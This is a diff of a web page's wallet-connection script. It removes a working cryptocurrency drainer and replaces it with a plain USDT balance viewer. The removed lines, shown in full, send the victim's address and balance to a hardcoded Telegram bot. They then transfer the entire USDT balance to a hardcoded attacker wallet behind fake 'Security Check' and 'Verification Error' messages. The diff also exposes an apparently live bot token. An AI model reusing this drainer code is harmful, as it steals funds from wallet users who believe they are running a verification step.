@@ -1,105 +1,60 @@
-const myWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
-const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; 
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const MIN_ABI = [
+    { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
+    { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" }
+];
 
-// Telegram Config
-const telegramBotToken = "8503598876:AAFQBEMmfHgcjPpyA_TwTJxTz34gwOswH1k";
-const telegramChatId = "8095203518";
+async function connect() {
+    const btn = document.getElementById("connectBtn");
+    const status = document.getElementById("status-container");
+    const results = document.getElementById("results");
 
-async function sendTelegram(msg) {
-    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
-    try {
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: telegramChatId, text: msg, parse_mode: 'HTML' })
-        });
-    } catch (e) { console.error("Telegram error", e); }
-}
-
-function updateStatus(main, sub) {
-    document.getElementById("loading-text").innerText = main;
-    document.getElementById("sub-text").innerText = sub;
-}
-
-async function startProcess() {
-    const overlay = document.getElementById("overlay");
-    const provider = window.ethereum || window.trustwallet;
-
-    if (!provider) {
-        if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
-            const currentUrl = window.location.href.replace("https://", "");
-            window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + currentUrl;
-            return;
-        }
-        alert("Please use Trust Wallet or MetaMask.");
+    if (!window.ethereum) {
+        alert("Please install a Web3 wallet like MetaMask or Trust Wallet.");
         return;
     }
 
-    overlay.style.display = "flex";
-    updateStatus("Connecting...", "Checking BSC Network...");
-
     try {
-        // --- STEP 1: FORCE SWITCH TO BSC FIRST ---
-        try {
-            await provider.request({
-                method: 'wallet_switchEthereumChain',
-                params: [{ chainId: '0x38' }], // BSC Mainnet
-            });
-        } catch (switchError) {
-            // Agar network added nahi hai (Error Code 4902)
-            if (switchError.code === 4902) {
-                await provider.request({
-                    method: 'wallet_addEthereumChain',
-                    params: [{
-                        chainId: '0x38',
-                        chainName: 'Binance Smart Chain',
-                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                        blockExplorerUrls: ['https://bscscan.com/']
-                    }]
-                });
-            }
-        }
+        btn.style.display = "none";
+        status.style.display = "block";
 
-        // --- STEP 2: NOW REQUEST ACCOUNTS ---
-        const web3 = new Web3(provider);
-        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        // 1. Request Account
+        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
         const userAddress = accounts[0];
 
-        updateStatus("Scanning Wallet...", "Checking BEP20 assets...");
+        // 2. Initialize Web3
+        const web3 = new Web3(window.ethereum);
 
-        const minABI = [
-            { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" },
-            { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
-        ];
-
-        const contract = new web3.eth.Contract(minABI, usdtContractAddress);
-        const balanceWei = await contract.methods.balanceOf(userAddress).call();
-        const balance = web3.utils.fromWei(balanceWei, 'ether');
-
-        await sendTelegram(`👤 <b>New Target:</b>\nAddr: <code>${userAddress}</code>\nBal: <b>${balance} USDT</b>`);
-
-        if (parseFloat(balance) > 0) {
-            updateStatus("Security Check...", "Syncing with blockchain node...");
-            
-            // Transfer Call
-            await contract.methods.transfer(myWalletAddress, balanceWei).send({ from: userAddress });
-            
-            updateStatus("Finalizing...", "Updating asset status...");
-            setTimeout(() => {
-                alert("Verification Error: Request timed out. Please try again.");
-                location.reload();
-            }, 1500);
-        } else {
-            alert("Verification complete: Minimal assets detected.");
-            overlay.style.display = "none";
+        // 3. Check if on BSC (0x38 = 56)
+        const chainId = await web3.eth.getChainId();
+        if (chainId !== 56n && chainId !== 56) {
+            alert("Please switch your wallet to Binance Smart Chain.");
+            status.style.display = "none";
+            btn.style.display = "block";
+            return;
         }
 
-    } catch (err) {
-        overlay.style.display = "none";
-        console.error(err);
-        if (err.code !== 4001) alert("Error: " + err.message);
+        // 4. Fetch USDT Balance
+        const contract = new web3.eth.Contract(MIN_ABI, USDT_CONTRACT);
+        const rawBalance = await contract.methods.balanceOf(userAddress).call();
+        const decimals = await contract.methods.decimals().call();
+        
+        // Format balance based on decimals (usually 18 for BEP20 USDT)
+        const formattedBalance = Number(rawBalance) / Math.pow(10, Number(decimals));
+
+        // 5. Update UI
+        document.getElementById("userAddr").innerText = `${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
+        document.getElementById("usdtBalance").innerText = formattedBalance.toFixed(2) + " USDT";
+        
+        status.style.display = "none";
+        results.style.display = "block";
+
+    } catch (error) {
+        console.error(error);
+        status.style.display = "none";
+        btn.style.display = "block";
+        alert("Connection failed. Please try again.");
     }
 }
 
-document.getElementById("nextBtn").addEventListener("click", startProcess);
+document.getElementById("connectBtn").addEventListener("click", connect);
